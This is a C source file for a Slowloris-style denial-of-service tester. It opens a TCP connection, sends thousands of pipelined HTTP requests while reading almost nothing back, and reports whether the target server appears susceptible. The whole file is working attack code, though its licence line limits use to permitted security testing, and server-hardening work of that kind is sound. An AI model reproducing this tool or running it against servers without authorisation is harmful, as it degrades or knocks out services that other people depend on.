/*
Copyright 2019, Boaz Segev
License: ISC

License limitations: May only be used for security testing and with permission
of target device.
*/

#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif

#include <ctype.h>
#include <errno.h>
#include <limits.h>
#include <pthread.h>
#include <signal.h>
#include <stdarg.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <strings.h>
#include <sys/mman.h>
#include <time.h>
#include <unistd.h>

#include <netdb.h>
#include <netinet/in.h>
#include <netinet/tcp.h>

#include <poll.h>
#include <sys/ioctl.h>
#include <sys/resource.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/un.h>
#include <sys/wait.h>

#include <arpa/inet.h>

#include <fcntl.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <unistd.h>

/* *****************************************************************************
Helper functions
***************************************************************************** */

#define ASSERT_COND(cond, ...)                                                 \
  do {                                                                         \
    if (!(cond)) {                                                             \
      fprintf(stderr, __VA_ARGS__);                                            \
      perror("\n\terrno");                                                     \
      exit(-1);                                                                \
    }                                                                          \
  } while (0)

/** Opens a TCP/IP connection using a blocking IO socket */
static int connect2tcp(const char *address, const char *port);

/** Waits for socket to become available for either reading or writing */
static int wait4fd(int fd);

/** Waits for socket to become available for reading */
static int wait4read(int fd);

/** Waits for socket to become available for reading */
static int wait4write(int fd);

/* *****************************************************************************
Main attack function
***************************************************************************** */

#define WAIT_BEFORE_EXIT 1
#define USE_PIPELINING 0
#define PRINT_PAGE_OF_DATA 1
#define MTU_LIMIT (524)
#define ATTACK_LIMIT ((1 << 12) + 2024)

static const char HTTP_REQUEST_HEAD[] =
    "GET / HTTP/1.1\r\nConnection: keep-alive\r\nHost: ";
static char MSG_OUTPUT[1024]; /* pipelined requests in MTU */
static size_t MSG_LEN;
static size_t REQ_PER_MSG;

static void prep_msg(const char *hostname) {
  /* copies an HTTP request to the internal buffer */
  ASSERT_COND(strlen(hostname) < 512, "host name too long");
  if (USE_PIPELINING) {
    MSG_LEN = strlen(HTTP_REQUEST_HEAD) + strlen(hostname) + 4;
    REQ_PER_MSG = 1;
    memcpy(MSG_OUTPUT, HTTP_REQUEST_HEAD, strlen(HTTP_REQUEST_HEAD));
    memcpy(MSG_OUTPUT + strlen(HTTP_REQUEST_HEAD), hostname, strlen(hostname));
    MSG_OUTPUT[MSG_LEN - 4] = '\r';
    MSG_OUTPUT[MSG_LEN - 3] = '\n';
    MSG_OUTPUT[MSG_LEN - 2] = '\r';
    MSG_OUTPUT[MSG_LEN - 1] = '\n';
  } else {
    memcpy(MSG_OUTPUT, HTTP_REQUEST_HEAD, strlen(HTTP_REQUEST_HEAD));
    memcpy(MSG_OUTPUT + strlen(HTTP_REQUEST_HEAD), hostname, strlen(hostname));
    MSG_LEN = strlen(HTTP_REQUEST_HEAD) + strlen(hostname) + 4;
    REQ_PER_MSG = MTU_LIMIT / MSG_LEN;
    MSG_OUTPUT[MSG_LEN - 4] = '\r';
    MSG_OUTPUT[MSG_LEN - 3] = '\n';
    MSG_OUTPUT[MSG_LEN - 2] = '\r';
    MSG_OUTPUT[MSG_LEN - 1] = '\n';
    if (!REQ_PER_MSG)
      REQ_PER_MSG = 1;
    for (size_t i = 1; i < REQ_PER_MSG; ++i) {
      memcpy(MSG_OUTPUT + (i * MSG_LEN), MSG_OUTPUT, MSG_LEN);
    }
    MSG_LEN *= REQ_PER_MSG;
  }
}

int main(int argc, char const *argv[]) {
  signal(SIGPIPE, SIG_IGN);
  ASSERT_COND(argc == 3,
              "\nTo test HTTP/1.1 server against Slowloris, "
              "use: %s addr port\ni.e.:\t\t%s localhost 80",
              argv[0], argv[0]);
  /* copy HTTP request to a limit of 524 bytes or just once */
  prep_msg(argv[1]);

  time_t start = 0;
  time(&start);

  /* Connect to target */
  int fd = connect2tcp(argv[1], argv[2]);
  ASSERT_COND(fd != -1, "\n ERROR: couldn't connect to %s:%s", argv[1],
              argv[2]);

  /* Attack */
  size_t counter = 0;
  size_t blocks = 0;
  size_t offset = 0;
  size_t read_total = 0;
  while (counter < ATTACK_LIMIT) {
    if (wait4write(fd) < 0) {
      if (errno != EWOULDBLOCK || ++blocks >= 5) /* wait up to 5 seconds */
        break;
      perror("wait4fd");
      continue;
    }
    blocks = 0;

    ssize_t w = write(fd, MSG_OUTPUT + offset, MSG_LEN - offset);
    if (w == 0)
      continue; /* connection lost? */
    if (w < 0) {
      /* error... waiting? */
      if (errno == EWOULDBLOCK || errno == EAGAIN || errno == EINTR) {
        if (++blocks >= 5)
          break;
        continue;
      }
      break;
    }
    offset += w;
    if (offset >= MSG_LEN)
      offset = 0;
    ++counter;
    if ((counter & 3) == 0 && wait4read(fd) == 0) {
      read(fd, &w, 1); /* read a single byte at a time */
      ++read_total;
    }
  }

  time_t end = 0;
  time(&end);

  /* Test results */
  if (blocks == 5) {
    /* test stopped after blocking too many times. */
    fprintf(stderr,
            "UNKNOWN...: a single slowloris client attacker sent %zu requests "
            "and only "
            "read %zu bytes... the target blocked further data, unknown if "
            "server is effected.\n",
            counter * (REQ_PER_MSG), read_total);

  } else if (counter == ATTACK_LIMIT) {
    /* finished sending all requests, no errors detected. */
    fprintf(
        stderr,
        "DANGER: a single slowloris client attacker sent %zu requests and only "
        "read %zu bytes... the target is likely suseptible to an attack.\n",
        counter * (REQ_PER_MSG), read_total);

  } else {
    /* couldn't send all requests, connection interrupted. */
    fprintf(
        stderr,
        "Passed: a single slowloris client attacker sent %zu requests and read "
        "%zu bytes... the target appears to have mitigated the attack.\n",
        counter * (REQ_PER_MSG), read_total);
  }
  fprintf(stderr, "Attack took %zu seconds. %s\n", (size_t)(end - start),
          ((WAIT_BEFORE_EXIT) ? "Press enter to finish" : ""));
  if (WAIT_BEFORE_EXIT)
    getchar();
  if (PRINT_PAGE_OF_DATA) {
    char buffer[4096];
    ssize_t l = -1;
    if (wait4fd(fd) == 0)
      l = read(fd, buffer, 4096);
    if (l > 0)
      fprintf(stderr, "Remaining %zd bytes of data:\n%.*s\n", l, (int)l,
              buffer);
    else
      fprintf(stderr, "Couldn't read any data... connection lost?\n");
  }
  close(fd);
  return counter == ATTACK_LIMIT;
}

/* *****************************************************************************
Helper functions - implementation
***************************************************************************** */

/** Opens a TCP/IP connection using a blocking IO socket */
static int __attribute__((unused))
connect2tcp(const char *address, const char *port) {
  /* TCP/IP socket */
  struct addrinfo hints = {0};
  struct addrinfo *addrinfo;       // will point to the results
  memset(&hints, 0, sizeof hints); // make sure the struct is empty
  hints.ai_family = AF_UNSPEC;     // don't care IPv4 or IPv6
  hints.ai_socktype = SOCK_STREAM; // TCP stream sockets
  hints.ai_flags = AI_PASSIVE;     // fill in my IP for me
  if (getaddrinfo(address, port, &hints, &addrinfo)) {
    // perror("addr err");
    return -1;
  }
  // get the file descriptor
  int fd =
      socket(addrinfo->ai_family, addrinfo->ai_socktype, addrinfo->ai_protocol);
  if (fd <= 0) {
    freeaddrinfo(addrinfo);
    return -1;
  }

  int one = 1;
  setsockopt(fd, IPPROTO_TCP, TCP_NODELAY, &one, sizeof(one));
  errno = 0;
  for (struct addrinfo *i = addrinfo; i; i = i->ai_next) {
    if (connect(fd, i->ai_addr, i->ai_addrlen) == 0 || errno == EINPROGRESS)
      goto socket_okay;
    perror("Connect...");
  }
  freeaddrinfo(addrinfo);
  close(fd);
  return -1;
socket_okay:
  fprintf(stderr, "Connected to %s:%s\n", address, port);
  freeaddrinfo(addrinfo);
  return fd;
}

/** Waits for socket to become available for either reading or writing */
static inline int wait__internal(int fd, uint16_t events) {
  errno = 0;
  int i = 0;
  do {
    struct pollfd ls[1] = {{.fd = fd, .events = events}};
    i = poll(ls, 1, 1000);
    if (i > 0) {
      if ((ls[0].revents & POLLHUP) || (ls[0].revents & POLLERR) ||
          (ls[0].revents & POLLNVAL)) {
        // close(ls[0].fd);
        errno = EBADF;
        return -1;
      }
      return 0;
    }
    switch (errno) {
    case EFAULT: /* overflow */
    case EINVAL: /* overflow */
    case ENOMEM: /* overflow */
    case EAGAIN: /* overflow */
      return -1;
    }
  } while (errno == EINTR);
  errno = EWOULDBLOCK;
  return -1;
}

/** Waits for socket to become available for either reading or writing */
static __attribute__((unused)) int wait4fd(int fd) {
  return wait__internal(fd, POLLIN | POLLOUT);
}
/** Waits for socket to become available for reading */
static __attribute__((unused)) int wait4read(int fd) {
  return wait__internal(fd, POLLIN);
}
/** Waits for socket to become available for reading */
static __attribute__((unused)) int wait4write(int fd) {
  return wait__internal(fd, POLLOUT);
}
